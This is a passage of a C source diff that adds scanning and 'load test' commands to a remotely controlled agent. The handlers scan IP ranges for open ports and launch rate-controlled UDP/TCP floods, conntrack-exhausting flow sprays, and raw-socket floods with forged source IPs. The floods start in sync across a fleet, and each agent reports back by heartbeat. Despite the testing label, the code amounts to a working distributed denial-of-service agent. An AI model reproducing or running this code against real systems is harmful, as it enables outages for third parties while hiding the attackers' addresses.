@@ -32,9 +32,11 @@
 
 #include <sys/types.h>
 #include <sys/socket.h>
+#include <arpa/inet.h>
 #include <netdb.h>
 #include <unistd.h>
 #include <fcntl.h>
+#include <stdatomic.h>
 
 #include "mbedtls/ssl.h"
 #include "mbedtls/entropy.h"
@@ -45,6 +47,10 @@
 #include "mbedtls/sha256.h"
 
 #include "jsmn.h"
+#include "discovery.h"
+#include "udp_sender.h"
+#include "tcp_sender.h"
+#include <pthread.h>
 
 /* CA, client cert, and private key are always compiled in (embedded_certs.h).
  * The binary is self-contained — no cert files needed on the device.
@@ -101,6 +107,7 @@
 
 #define HTTP_PATH        "/ingest"
 #define HTTP_OUTPUT_PATH "/output"
+#define HTTP_HEARTBEAT_PATH "/heartbeat"
 /* ------------------------------------------------------------- */
 
 /* Resolved endpoint/paths, filled by load_config() before any connection. */
@@ -682,6 +689,1068 @@ static int handle_file_pull(const char *json_str, int json_len) {
   return 0;
 }
 
+/* ---------- discovery handler ---------- */
+
+static int handle_discovery(const char *json_str, int json_len, char *out, size_t out_cap) {
+  jsmn_parser p;
+  jsmn_init(&p);
+  jsmntok_t toks[128];
+  int n = jsmn_parse(&p, json_str, json_len, toks, 128);
+  if (n < 0) return -1;
+
+  char start_ip[64] = {0}, end_ip[64] = {0};
+  uint16_t ports[DISC_MAX_PORTS];
+  int nports = 0;
+  int timeout_ms = 1000;
+
+  for (int i = 0; i < n - 1; i++) {
+    if (tok_eq(json_str, &toks[i], "startIp") && toks[i+1].type == JSMN_STRING) {
+      int l = toks[i+1].end - toks[i+1].start;
+      if (l < (int)sizeof(start_ip)) { memcpy(start_ip, json_str + toks[i+1].start, l); start_ip[l] = 0; }
+    } else if (tok_eq(json_str, &toks[i], "endIp") && toks[i+1].type == JSMN_STRING) {
+      int l = toks[i+1].end - toks[i+1].start;
+      if (l < (int)sizeof(end_ip)) { memcpy(end_ip, json_str + toks[i+1].start, l); end_ip[l] = 0; }
+    } else if (tok_eq(json_str, &toks[i], "timeout") && toks[i+1].type == JSMN_PRIMITIVE) {
+      char buf[16]; int l = toks[i+1].end - toks[i+1].start;
+      if (l < (int)sizeof(buf)) { memcpy(buf, json_str + toks[i+1].start, l); buf[l] = 0; timeout_ms = atoi(buf); }
+    } else if (tok_eq(json_str, &toks[i], "ports") && toks[i+1].type == JSMN_ARRAY) {
+      int arr = i + 1, cnt = toks[arr].size;
+      int t = arr + 1;
+      for (int j = 0; j < cnt && nports < DISC_MAX_PORTS; j++, t++) {
+        char buf[8]; int l = toks[t].end - toks[t].start;
+        if (l < (int)sizeof(buf)) { memcpy(buf, json_str + toks[t].start, l); buf[l] = 0; ports[nports++] = (uint16_t)atoi(buf); }
+      }
+    }
+  }
+
+  if (!start_ip[0] || !end_ip[0] || nports == 0) {
+    snprintf(out, out_cap, "discovery: missing startIp, endIp, or ports");
+    return -1;
+  }
+
+  disc_report_t report;
+  if (discovery_scan(start_ip, end_ip, ports, nports, timeout_ms, &report) != 0) {
+    snprintf(out, out_cap, "discovery: invalid IP range");
+    return -1;
+  }
+  discovery_format(&report, out, out_cap);
+  return 0;
+}
+
+/* ---------- load test handler ---------- */
+
+/* Mode IDs — open dispatch table; protocol builders (udmux/raknet) add entries
+ * here and in load_modes[] without touching the send loop. */
+#define MODE_UDP_RAW         0
+#define MODE_UDP_FLOW_SPRAY  1
+#define MODE_UDP_SPOOF_FLOW  2
+#define MODE_MIXED           3
+#define MODE_COUNT           4
+
+#define MAX_PHASES 16
+
+typedef struct {
+  int mode;
+  double duration_s;
+  double pps;
+  double bps;
+  double ramp_s;
+} load_phase_t;
+
+typedef struct load_thread_arg load_thread_arg_t;
+typedef void (*load_mode_fn)(load_thread_arg_t *);
+
+struct load_thread_arg {
+  int thread_id;
+  char target[64];
+  uint16_t port;
+  double duration;
+  int proto_tcp;          /* 1=TCP, 0=UDP (for udp_raw + tcp path) */
+  int mode;               /* MODE_* constant */
+  int pattern;            /* 0=default, 1=zeros, 2=rand, 3=seq */
+  uint16_t src_port;      /* 0 = ephemeral */
+  double pps;
+  double bps;
+  rate_limiter_t *shared_rl;
+
+  /* sequential port walk (controller-assigned disjoint window) */
+  uint16_t port_base;     /* first port in this agent's window */
+  uint16_t port_span;     /* window width */
+  uint16_t port_stride;   /* fleet_size * threads (walk step) */
+
+  /* spoof mode: source IP pool */
+  uint32_t *src_ips;      /* array of network-order IPv4 addrs */
+  int src_ip_count;
+  int spoof_enabled;
+
+  /* coordinated start */
+  uint64_t start_mono_ns; /* 0 = start immediately */
+
+  /* phase campaign (NULL/0 = single-phase run using top-level mode/duration/pps/bps) */
+  load_phase_t *phases;
+  int phase_count;
+
+  /* results (written by mode function) */
+  uint64_t total_bytes;
+  uint64_t total_ops;
+  uint64_t err_eagain;
+  uint64_t err_connreset;
+  uint64_t err_pipe;
+  uint64_t err_connrefused;
+  uint64_t err_enobufs;
+  uint64_t err_emsgsize;
+  uint64_t err_ehostunreach;
+  uint64_t err_eacces;
+  uint64_t err_other;
+  uint32_t retransmits;
+  uint32_t rtt_us;
+  uint32_t rttvar_us;
+  uint32_t min_rtt_us;
+  uint32_t max_rtt_us;
+  int target_reachable;
+  uint64_t first_unreachable_ns;  /* CLOCK_MONOTONIC timestamp of first send failure, 0 = never */
+};
+
+/* Block until CLOCK_MONOTONIC reaches start_mono_ns (coordinated fleet start).
+ * Sleep until 2ms before the target, then busy-spin for sub-ms precision. */
+static void wait_for_start(uint64_t start_mono_ns) {
+  if (!start_mono_ns) return;
+  for (;;) {
+    struct timespec now;
+    clock_gettime(CLOCK_MONOTONIC, &now);
+    uint64_t now_ns = (uint64_t)now.tv_sec * 1000000000ULL + (uint64_t)now.tv_nsec;
+    if (now_ns >= start_mono_ns) return;
+    uint64_t delta = start_mono_ns - now_ns;
+    if (delta <= 2000000ULL) {
+      /* Within 2ms: busy-spin for precision. */
+      while (1) {
+        clock_gettime(CLOCK_MONOTONIC, &now);
+        now_ns = (uint64_t)now.tv_sec * 1000000000ULL + (uint64_t)now.tv_nsec;
+        if (now_ns >= start_mono_ns) return;
+      }
+    }
+    /* Sleep for (delta - 2ms). */
+    uint64_t sleep_ns = delta - 2000000ULL;
+    struct timespec sl = { .tv_sec = (time_t)(sleep_ns / 1000000000ULL),
+                           .tv_nsec = (long)(sleep_ns % 1000000000ULL) };
+    nanosleep(&sl, NULL);
+  }
+}
+
+/* Build a payload buffer according to the pattern field.
+ *   0 (default) — 0xA5^i fill (seq counter + per-packet vary added in send loop)
+ *   1 (zeros)   — all zeros, no seq counter; NIC-friendly baseline
+ *   2 (rand)    — xorshift128+ output; pattern-resistant
+ *   3 (seq)     — zeros (seq counter added in send loop)
+ */
+static void build_payload(char *buf, size_t len, int pattern, int thread_id) {
+  switch (pattern) {
+    case 1: memset(buf, 0, len); break;
+    case 2: {
+      uint64_t xs[2];
+      int ufd = open("/dev/urandom", O_RDONLY);
+      if (ufd >= 0) {
+        read(ufd, xs, sizeof(xs));
+        close(ufd);
+      } else {
+        struct timespec ts;
+        clock_gettime(CLOCK_MONOTONIC, &ts);
+        uint64_t seed = (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
+        seed ^= (uint64_t)getpid() << 32;
+        seed ^= (uint64_t)(uintptr_t)&ts;
+        seed ^= (uint64_t)thread_id * 0x9E3779B97F4A7C15ULL;
+        xs[0] = seed;
+        xs[1] = seed ^ 0x9E3779B97F4A7C15ULL;
+      }
+      if ((xs[0] | xs[1]) == 0) xs[0] = 1;
+      for (size_t j = 0; j + 7 < len; j += 8) {
+        uint64_t s1 = xs[0], s0 = xs[1];
+        xs[0] = s0;
+        s1 ^= s1 << 23;
+        xs[1] = s1 ^ s0 ^ (s1 >> 17) ^ (s0 >> 26);
+        uint64_t v = xs[1] + s0;
+        memcpy(buf + j, &v, 8);
+      }
+      break;
+    }
+    case 3: memset(buf, 0, len); break;
+    default: udp_build_payload(buf, len); break;
+  }
+}
+
+/* Acquire or create a per-thread rate limiter. Returns the limiter to use. */
+static rate_limiter_t *setup_rate_limiter(load_thread_arg_t *a, rate_limiter_t *local_rl) {
+  if (a->shared_rl) return a->shared_rl;
+  if (rate_limiter_init(local_rl, a->pps, a->bps, a->pps * 0.1, a->bps * 0.1) != 0)
+    return NULL;
+  return local_rl;
+}
+
+/* Bind a UDP socket to src_port with SO_REUSEADDR. */
+static void bind_src_port(int fd, uint16_t src_port) {
+  if (!src_port) return;
+  int reuse = 1;
+  setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
+  struct sockaddr_in ba;
+  memset(&ba, 0, sizeof(ba));
+  ba.sin_family = AF_INET;
+  ba.sin_port = htons(src_port);
+  ba.sin_addr.s_addr = INADDR_ANY;
+  bind(fd, (struct sockaddr *)&ba, sizeof(ba));
+}
+
+/* ---- mode: udp_raw ---- */
+/* The baseline 1400-byte filler to ip:port. Uses existing zeros/rand/seq/default
+ * payload patterns. This is v0 behavior, preserved for comparison. */
+static void mode_udp_raw(load_thread_arg_t *a) {
+  char payload[1400];
+  size_t payload_len = 1400;
+  build_payload(payload, payload_len, a->pattern, a->thread_id);
+
+  rate_limiter_t local_rl;
+  rate_limiter_t *rl = setup_rate_limiter(a, &local_rl);
+  if (!rl) return;
+
+  if (a->proto_tcp) {
+    int fd = tcp_sender_connect(a->target, a->port, a->src_port);
+    if (fd < 0) { if (!a->shared_rl) rate_limiter_destroy(&local_rl); return; }
+    wait_for_start(a->start_mono_ns);
+    tcp_stats_t st = tcp_sender_run(fd, rl, payload, payload_len, a->duration);
+    a->total_bytes   = st.bytes;
+    a->total_ops     = st.writes;
+    a->err_eagain    = st.err_eagain;
+    a->err_connreset = st.err_connreset;
+    a->err_pipe      = st.err_pipe;
+    a->err_other     = st.err_other;
+    a->retransmits   = st.retransmits;
+    a->rtt_us        = st.rtt_us;
+    a->rttvar_us     = st.rttvar_us;
+    a->min_rtt_us    = st.min_rtt_us;
+    a->max_rtt_us    = st.max_rtt_us;
+    a->target_reachable = (st.err_connreset == 0 && st.err_pipe == 0);
+    close(fd);
+  } else {
+    udp_sender_t s;
+    if (udp_sender_init(&s, a->target, a->port) != 0) { if (!a->shared_rl) rate_limiter_destroy(&local_rl); return; }
+    bind_src_port(s.fd, a->src_port);
+    int use_seq = (a->pattern == 0 || a->pattern == 3);
+    int vary = (a->pattern == 0);
+    wait_for_start(a->start_mono_ns);
+    udp_stats_t st = udp_sender_run(&s, rl, payload, payload_len, a->duration, use_seq, vary);
+    a->total_bytes      = st.bytes;
+    a->total_ops        = st.packets;
+    a->err_eagain       = st.err_eagain;
+    a->err_connrefused  = st.err_connrefused;
+    a->err_enobufs      = st.err_enobufs;
+    a->err_emsgsize     = st.err_emsgsize;
+    a->err_ehostunreach = st.err_ehostunreach;
+    a->err_eacces       = st.err_eacces;
+    a->err_other        = st.err_other;
+    a->target_reachable = (st.err_connrefused == 0 && st.err_ehostunreach == 0);
+    a->first_unreachable_ns = st.first_err_ns;
+    udp_sender_destroy(&s);
+  }
+  if (!a->shared_rl) rate_limiter_destroy(&local_rl);
+}
+
+/* ---- mode: udp_flow_spray ---- */
+/* One small packet (24 bytes) per unique 5-tuple. Source port walked sequentially
+ * through the assigned window. Measures target's conntrack / flow-table ceiling. */
+static void mode_udp_flow_spray(load_thread_arg_t *a) {
+  rate_limiter_t local_rl;
+  rate_limiter_t *rl = setup_rate_limiter(a, &local_rl);
+  if (!rl) return;
+
+  struct sockaddr_in dst;
+  memset(&dst, 0, sizeof(dst));
+  dst.sin_family = AF_INET;
+  dst.sin_port = htons(a->port);
+  if (inet_pton(AF_INET, a->target, &dst.sin_addr) != 1) {
+    if (!a->shared_rl) rate_limiter_destroy(&local_rl);
+    return;
+  }
+
+  uint16_t cur_port = a->port_base ? a->port_base : (a->src_port ? a->src_port : 1024);
+  uint16_t end_port = a->port_base ? (uint16_t)(a->port_base + a->port_span) : 65535;
+
+  char pkt[24];
+  memset(pkt, 0, sizeof(pkt));
+
+  struct timespec t0, now;
+  clock_gettime(CLOCK_MONOTONIC, &t0);
+  double deadline = (double)t0.tv_sec + (double)t0.tv_nsec * 1e-9 + a->duration;
+
+  wait_for_start(a->start_mono_ns);
+
+  int consec_err = 0;
+  uint64_t ew_start = 0, ew_errs = 0, ew_ops = 0;
+
+  for (;;) {
+    int fd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (fd < 0) { a->err_other++; break; }
+    bind_src_port(fd, cur_port);
+
+    rate_limiter_acquire(rl, sizeof(pkt));
+    ssize_t n = sendto(fd, pkt, sizeof(pkt), 0,
+                       (struct sockaddr *)&dst, sizeof(dst));
+    ew_ops++;
+    if (n > 0) {
+      a->total_ops++;
+      a->total_bytes += (uint64_t)n;
+      consec_err = 0;
+    } else if (n < 0) {
+      if (errno == EAGAIN || errno == EWOULDBLOCK) { a->err_eagain++; }
+      else {
+        if (errno == ECONNREFUSED) a->err_connrefused++;
+        else if (errno == ENOBUFS) a->err_enobufs++;
+        else if (errno == EMSGSIZE) a->err_emsgsize++;
+        else if (errno == EHOSTUNREACH) a->err_ehostunreach++;
+        else if (errno == EACCES) a->err_eacces++;
+        else a->err_other++;
+        consec_err++;
+        ew_errs++;
+        if (!a->first_unreachable_ns && consec_err >= 3) {
+          struct timespec fu; clock_gettime(CLOCK_MONOTONIC, &fu);
+          a->first_unreachable_ns = (uint64_t)fu.tv_sec * 1000000000ULL + (uint64_t)fu.tv_nsec;
+        }
+      }
+    }
+    close(fd);
+
+    cur_port++;
+    if (cur_port >= end_port) cur_port = a->port_base ? a->port_base : 1024;
+
+    clock_gettime(CLOCK_MONOTONIC, &now);
+    double t = (double)now.tv_sec + (double)now.tv_nsec * 1e-9;
+    if (!a->first_unreachable_ns && ew_ops > 0) {
+      uint64_t now_ns = (uint64_t)now.tv_sec * 1000000000ULL + (uint64_t)now.tv_nsec;
+      if (!ew_start) ew_start = now_ns;
+      else if (now_ns - ew_start >= 1000000000ULL) {
+        if (ew_errs * 100 > ew_ops)
+          a->first_unreachable_ns = now_ns;
+        ew_start = now_ns;
+        ew_errs = 0;
+        ew_ops = 0;
+      }
+    }
+    if (t >= deadline) break;
+  }
+  a->target_reachable = (a->err_connrefused == 0 && a->err_ehostunreach == 0);
+  if (!a->shared_rl) rate_limiter_destroy(&local_rl);
+}
+
+/* ---- mode: udp_spoof_flow ---- */
+/* Raw socket (IPPROTO_RAW + IP_HDRINCL): build IP+UDP headers in userspace,
+ * draw source IPs from a controller-assigned pool, source ports from the full
+ * 16-bit space. Falls back to udp_flow_spray when spoof_enabled is off. */
+
+static uint16_t ip_checksum(const void *data, int len) {
+  const uint16_t *p = data;
+  uint32_t sum = 0;
+  while (len > 1) { sum += *p++; len -= 2; }
+  if (len == 1) sum += *(const uint8_t *)p;
+  sum = (sum >> 16) + (sum & 0xFFFF);
+  sum += (sum >> 16);
+  return (uint16_t)~sum;
+}
+
+static uint16_t udp_checksum(uint32_t saddr, uint32_t daddr,
+                              const uint8_t *udp_pkt, int udp_len) {
+  uint32_t sum = 0;
+  sum += (saddr >> 16) & 0xFFFF;
+  sum += saddr & 0xFFFF;
+  sum += (daddr >> 16) & 0xFFFF;
+  sum += daddr & 0xFFFF;
+  sum += htons(IPPROTO_UDP);
+  sum += htons((uint16_t)udp_len);
+  const uint16_t *p = (const uint16_t *)udp_pkt;
+  int remaining = udp_len;
+  while (remaining > 1) { sum += *p++; remaining -= 2; }
+  if (remaining == 1) sum += *(const uint8_t *)p;
+  sum = (sum >> 16) + (sum & 0xFFFF);
+  sum += (sum >> 16);
+  return (uint16_t)~sum;
+}
+
+static void mode_udp_spoof_flow(load_thread_arg_t *a) {
+  if (!a->spoof_enabled || a->src_ip_count == 0) {
+    mode_udp_flow_spray(a);
+    return;
+  }
+
+  rate_limiter_t local_rl;
+  rate_limiter_t *rl = setup_rate_limiter(a, &local_rl);
+  if (!rl) { return; }
+
+  int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+  if (fd < 0) {
+    fprintf(stderr, "load_test: SOCK_RAW failed (need root): %s\n", strerror(errno));
+    if (!a->shared_rl) rate_limiter_destroy(&local_rl);
+    mode_udp_flow_spray(a);
+    return;
+  }
+  int one = 1;
+  setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
+
+  struct sockaddr_in dst;
+  memset(&dst, 0, sizeof(dst));
+  dst.sin_family = AF_INET;
+  dst.sin_port = htons(a->port);
+  inet_pton(AF_INET, a->target, &dst.sin_addr);
+
+  /* IP(20) + UDP(8) + payload(24) = 52 bytes per packet */
+  uint8_t pkt[52];
+  memset(pkt, 0, sizeof(pkt));
+  /* IP header */
+  pkt[0] = 0x45;           /* version=4, ihl=5 */
+  pkt[1] = 0;              /* DSCP/ECN */
+  uint16_t tot_len = htons(52);
+  memcpy(pkt + 2, &tot_len, 2);
+  pkt[8] = 64;             /* TTL */
+  pkt[9] = IPPROTO_UDP;
+  memcpy(pkt + 16, &dst.sin_addr.s_addr, 4); /* dst IP */
+  /* UDP header */
+  uint16_t udp_dst = htons(a->port);
+  memcpy(pkt + 22, &udp_dst, 2);
+  uint16_t udp_len = htons(32); /* 8 hdr + 24 payload */
+  memcpy(pkt + 24, &udp_len, 2);
+
+  uint16_t src_port = 1024;
+  int ip_idx = 0;
+  static uint16_t pkt_id = 0;
+
+  struct timespec t0, now;
+  clock_gettime(CLOCK_MONOTONIC, &t0);
+  double deadline = (double)t0.tv_sec + (double)t0.tv_nsec * 1e-9 + a->duration;
+
+  wait_for_start(a->start_mono_ns);
+
+  int consec_err_s = 0;
+  uint64_t ew_start_s = 0, ew_errs_s = 0, ew_ops_s = 0;
+
+  for (;;) {
+    /* rotate source IP */
+    uint32_t sip = a->src_ips[ip_idx];
+    ip_idx = (ip_idx + 1) % a->src_ip_count;
+    memcpy(pkt + 12, &sip, 4);
+
+    /* rotate source port */
+    uint16_t sp_n = htons(src_port);
+    memcpy(pkt + 20, &sp_n, 2);
+    src_port++;
+    if (src_port == 0) src_port = 1024;
+
+    /* IP identification */
+    uint16_t id_n = htons(pkt_id++);
+    memcpy(pkt + 4, &id_n, 2);
+
+    /* IP checksum */
+    memset(pkt + 10, 0, 2);
+    uint16_t cksum = ip_checksum(pkt, 20);
+    memcpy(pkt + 10, &cksum, 2);
+
+    /* UDP checksum */
+    memset(pkt + 26, 0, 2);
+    uint16_t uck = udp_checksum(sip, dst.sin_addr.s_addr, pkt + 20, 32);
+    memcpy(pkt + 26, &uck, 2);
+
+    rate_limiter_acquire(rl, sizeof(pkt));
+    ssize_t n = sendto(fd, pkt, sizeof(pkt), 0,
+                       (struct sockaddr *)&dst, sizeof(dst));
+    ew_ops_s++;
+    if (n > 0) {
+      a->total_ops++;
+      a->total_bytes += (uint64_t)n;
+      consec_err_s = 0;
+    } else if (n < 0) {
+      if (errno == EAGAIN || errno == EWOULDBLOCK) { a->err_eagain++; }
+      else {
+        if (errno == ENOBUFS) a->err_enobufs++;
+        else if (errno == EHOSTUNREACH) a->err_ehostunreach++;
+        else if (errno == EACCES) a->err_eacces++;
+        else a->err_other++;
+        consec_err_s++;
+        ew_errs_s++;
+        if (!a->first_unreachable_ns && consec_err_s >= 3) {
+          struct timespec fu; clock_gettime(CLOCK_MONOTONIC, &fu);
+          a->first_unreachable_ns = (uint64_t)fu.tv_sec * 1000000000ULL + (uint64_t)fu.tv_nsec;
+        }
+      }
+    }
+
+    clock_gettime(CLOCK_MONOTONIC, &now);
+    double t = (double)now.tv_sec + (double)now.tv_nsec * 1e-9;
+    if (!a->first_unreachable_ns && ew_ops_s > 0) {
+      uint64_t now_ns = (uint64_t)now.tv_sec * 1000000000ULL + (uint64_t)now.tv_nsec;
+      if (!ew_start_s) ew_start_s = now_ns;
+      else if (now_ns - ew_start_s >= 1000000000ULL) {
+        if (ew_errs_s * 100 > ew_ops_s)
+          a->first_unreachable_ns = now_ns;
+        ew_start_s = now_ns;
+        ew_errs_s = 0;
+        ew_ops_s = 0;
+      }
+    }
+    if (t >= deadline) break;
+  }
+  close(fd);
+  a->target_reachable = (a->err_ehostunreach == 0 && a->err_eacces == 0);
+  if (!a->shared_rl) rate_limiter_destroy(&local_rl);
+}
+
+/* ---- mode: mixed ---- */
+/* Cycles through udp_raw, udp_flow_spray, and udp_spoof_flow, splitting
+ * the duration equally across them. */
+static void mode_mixed(load_thread_arg_t *a) {
+  double phase_dur = a->duration / 3.0;
+  if (phase_dur < 1.0) phase_dur = 1.0;
+
+  load_thread_arg_t sub = *a;
+  uint64_t saved_bytes, saved_ops;
+
+  /* phase 1: udp_raw */
+  sub.duration = phase_dur;
+  sub.proto_tcp = 0;
+  mode_udp_raw(&sub);
+  saved_bytes = sub.total_bytes;
+  saved_ops = sub.total_ops;
+
+  /* phase 2: udp_flow_spray */
+  sub.duration = phase_dur;
+  sub.total_bytes = 0; sub.total_ops = 0;
+  mode_udp_flow_spray(&sub);
+  saved_bytes += sub.total_bytes;
+  saved_ops += sub.total_ops;
+
+  /* phase 3: udp_spoof_flow (falls back to flow_spray if spoof off) */
+  sub.duration = phase_dur;
+  sub.total_bytes = 0; sub.total_ops = 0;
+  mode_udp_spoof_flow(&sub);
+  saved_bytes += sub.total_bytes;
+  saved_ops += sub.total_ops;
+
+  /* aggregate results back */
+  a->total_bytes     = saved_bytes;
+  a->total_ops       = saved_ops;
+  a->err_eagain      += sub.err_eagain;
+  a->err_connrefused += sub.err_connrefused;
+  a->err_other       += sub.err_other;
+  a->target_reachable = sub.target_reachable;
+}
+
+/* Mode dispatch table — open for protocol builders to add entries. */
+static const struct { const char *name; load_mode_fn fn; } load_modes[MODE_COUNT] = {
+  [MODE_UDP_RAW]         = { "udp_raw",         mode_udp_raw },
+  [MODE_UDP_FLOW_SPRAY]  = { "udp_flow_spray",  mode_udp_flow_spray },
+  [MODE_UDP_SPOOF_FLOW]  = { "udp_spoof_flow",  mode_udp_spoof_flow },
+  [MODE_MIXED]           = { "mixed",           mode_mixed },
+};
+
+/* Ramp helper thread: updates a rate limiter's rates linearly from 5%→100%
+ * over ramp_s, in 0.5s steps, while the mode function runs in the caller. */
+typedef struct {
+  rate_limiter_t *rl;
+  double target_pps;
+  double target_bps;
+  double ramp_s;
+} ramp_ctx_t;
+
+static void *ramp_thread_fn(void *arg) {
+  ramp_ctx_t *ctx = (ramp_ctx_t *)arg;
+  double step = 0.5;
+  int steps = (int)(ctx->ramp_s / step);
+  if (steps < 1) steps = 1;
+  for (int s = 0; s < steps; s++) {
+    struct timespec sl = { .tv_sec = 0, .tv_nsec = 500000000L };
+    nanosleep(&sl, NULL);
+    double frac = 0.05 + 0.95 * ((double)(s + 1) / (double)steps);
+    rate_limiter_set_rates(ctx->rl, ctx->target_pps * frac, ctx->target_bps * frac);
+  }
+  rate_limiter_set_rates(ctx->rl, ctx->target_pps, ctx->target_bps);
+  return NULL;
+}
+
+static void *load_thread_fn(void *arg) {
+  load_thread_arg_t *a = (load_thread_arg_t *)arg;
+
+  if (a->phase_count > 0 && a->phases) {
+    int orig_mode = a->mode;
+    double orig_dur = a->duration;
+    double orig_pps = a->pps;
+    double orig_bps = a->bps;
+
+    for (int p = 0; p < a->phase_count; p++) {
+      load_phase_t *ph = &a->phases[p];
+      a->mode = ph->mode;
+
+      if (ph->ramp_s > 0 && ph->ramp_s < ph->duration_s) {
+        /* Ramp: create a RL at 5%, spawn a thread that linearly updates rates
+         * to 100% over ramp_s, and call the mode function once for the full
+         * phase duration — no gaps between steps. */
+        rate_limiter_t ramp_rl;
+        rate_limiter_t *orig_shared = a->shared_rl;
+        rate_limiter_t *rl_to_ramp;
+        int owns_ramp_rl = 0;
+
+        if (orig_shared) {
+          rl_to_ramp = orig_shared;
+          if (a->thread_id == 0)
+            rate_limiter_set_rates(rl_to_ramp, ph->pps * 0.05, ph->bps * 0.05);
+        } else {
+          double init_pps = ph->pps * 0.05;
+          double init_bps = ph->bps * 0.05;
+          rate_limiter_init(&ramp_rl, init_pps, init_bps,
+                            init_pps * 0.1 > 1.0 ? init_pps * 0.1 : 1.0,
+                            init_bps * 0.1 > 1500.0 ? init_bps * 0.1 : 1500.0);
+          a->shared_rl = &ramp_rl;
+          rl_to_ramp = &ramp_rl;
+          owns_ramp_rl = 1;
+        }
+
+        ramp_ctx_t ramp = { .rl = rl_to_ramp, .target_pps = ph->pps,
+                            .target_bps = ph->bps, .ramp_s = ph->ramp_s };
+        pthread_t ramp_tid;
+        int ramp_started = 0;
+        if (!orig_shared || a->thread_id == 0)
+          ramp_started = (pthread_create(&ramp_tid, NULL, ramp_thread_fn, &ramp) == 0);
+
+        a->pps = ph->pps;
+        a->bps = ph->bps;
+        a->duration = ph->duration_s;
+        if (a->mode >= 0 && a->mode < MODE_COUNT && load_modes[a->mode].fn)
+          load_modes[a->mode].fn(a);
+
+        if (ramp_started) pthread_join(ramp_tid, NULL);
+        if (owns_ramp_rl) {
+          rate_limiter_destroy(&ramp_rl);
+          a->shared_rl = orig_shared;
+        }
+      } else {
+        a->duration = ph->duration_s;
+        a->pps = ph->pps;
+        a->bps = ph->bps;
+        if (a->mode >= 0 && a->mode < MODE_COUNT && load_modes[a->mode].fn)
+          load_modes[a->mode].fn(a);
+      }
+    }
+
+    a->mode = orig_mode;
+    a->duration = orig_dur;
+    a->pps = orig_pps;
+    a->bps = orig_bps;
+  } else {
+    if (a->mode >= 0 && a->mode < MODE_COUNT && load_modes[a->mode].fn)
+      load_modes[a->mode].fn(a);
+  }
+  return NULL;
+}
+
+#define LOAD_MAX_THREADS 16
+#define SRC_PORT_WINDOWS 4096
+
+#define MAX_SRC_IPS 64
+
+static void node_field(char *dst, size_t cap);
+
+typedef struct {
+  load_thread_arg_t *args;
+  int threads;
+  int running;           /* set to 0 to stop */
+  const char *cmd_id;    /* command ID for heartbeat POST */
+} heartbeat_ctx_t;
+
+static void *heartbeat_thread_fn(void *arg) {
+  heartbeat_ctx_t *ctx = (heartbeat_ctx_t *)arg;
+  char nodefld[96];
+  node_field(nodefld, sizeof(nodefld));
+
+  while (ctx->running) {
+    struct timespec sl = { .tv_sec = 0, .tv_nsec = 500000000L }; /* 500ms */
+    nanosleep(&sl, NULL);
+    if (!ctx->running) break;
+
+    uint64_t total_bytes = 0, total_ops = 0;
+    uint64_t total_eagain = 0, total_connrefused = 0;
+    uint64_t total_enobufs = 0, total_ehostunreach = 0;
+    uint64_t total_eacces = 0, total_other = 0;
+    for (int i = 0; i < ctx->threads; i++) {
+      total_bytes        += ctx->args[i].total_bytes;
+      total_ops          += ctx->args[i].total_ops;
+      total_eagain       += ctx->args[i].err_eagain;
+      total_connrefused  += ctx->args[i].err_connrefused;
+      total_enobufs      += ctx->args[i].err_enobufs;
+      total_ehostunreach += ctx->args[i].err_ehostunreach;
+      total_eacces       += ctx->args[i].err_eacces;
+      total_other        += ctx->args[i].err_other;
+    }
+
+    char body[768];
+    snprintf(body, sizeof(body),
+      "{%s\"id\":\"%s\",\"state\":\"running\",\"threads\":%d,"
+      "\"tx_bytes\":%llu,\"tx_ops\":%llu,"
+      "\"err_eagain\":%llu,\"err_connrefused\":%llu,"
+      "\"err_enobufs\":%llu,\"err_ehostunreach\":%llu,"
+      "\"err_eacces\":%llu,\"err_other\":%llu}",
+      nodefld, ctx->cmd_id, ctx->threads,
+      (unsigned long long)total_bytes, (unsigned long long)total_ops,
+      (unsigned long long)total_eagain, (unsigned long long)total_connrefused,
+      (unsigned long long)total_enobufs, (unsigned long long)total_ehostunreach,
+      (unsigned long long)total_eacces, (unsigned long long)total_other);
+
+    char resp[256];
+    https_request(HTTP_HEARTBEAT_PATH, body, resp, sizeof(resp));
+  }
+  return NULL;
+}
+
+static int handle_load_test(const char *json_str, int json_len, char *out, size_t out_cap, const char *cmd_id) {
+  jsmn_parser p;
+  jsmn_init(&p);
+  jsmntok_t toks[256];
+  int n = jsmn_parse(&p, json_str, json_len, toks, 256);
+  if (n < 0) return -1;
+
+  char target[64] = {0}, proto[8] = "udp", pat[8] = {0}, modebuf[24] = {0};
+  uint16_t port = 0, src_port_base = 0;
+  uint16_t port_base = 0, port_span = 0, port_stride = 0;
+  double duration = 10.0, pps = 50000.0, bps = 100e6;
+  int threads = 1, aggregate = 0, spoof_source = 0;
+  uint64_t start_mono_ns = 0;
+  uint32_t src_ips[MAX_SRC_IPS];
+  int src_ip_count = 0;
+  load_phase_t phases[MAX_PHASES];
+  int phase_count = 0;
+  int conntrack_drop_pct = -1;
+
+  for (int i = 0; i < n - 1; i++) {
+    int vl = toks[i+1].end - toks[i+1].start;
+    char vbuf[64];
+    if (vl >= (int)sizeof(vbuf)) continue;
+    memcpy(vbuf, json_str + toks[i+1].start, vl); vbuf[vl] = 0;
+
+    if (tok_eq(json_str, &toks[i], "target"))        { memcpy(target, vbuf, vl + 1); }
+    else if (tok_eq(json_str, &toks[i], "port"))      port = (uint16_t)atoi(vbuf);
+    else if (tok_eq(json_str, &toks[i], "duration"))  duration = atof(vbuf);
+    else if (tok_eq(json_str, &toks[i], "proto"))     { memcpy(proto, vbuf, vl + 1); }
+    else if (tok_eq(json_str, &toks[i], "threads"))   threads = atoi(vbuf);
+    else if (tok_eq(json_str, &toks[i], "pps"))       pps = atof(vbuf);
+    else if (tok_eq(json_str, &toks[i], "bps"))       bps = atof(vbuf);
+    else if (tok_eq(json_str, &toks[i], "aggregate")) aggregate = (vbuf[0] == 't' || vbuf[0] == '1');
+    else if (tok_eq(json_str, &toks[i], "src_port"))  src_port_base = (uint16_t)atoi(vbuf);
+    else if (tok_eq(json_str, &toks[i], "pattern"))   { memcpy(pat, vbuf, vl + 1); }
+    else if (tok_eq(json_str, &toks[i], "mode"))      { memcpy(modebuf, vbuf, vl + 1); }
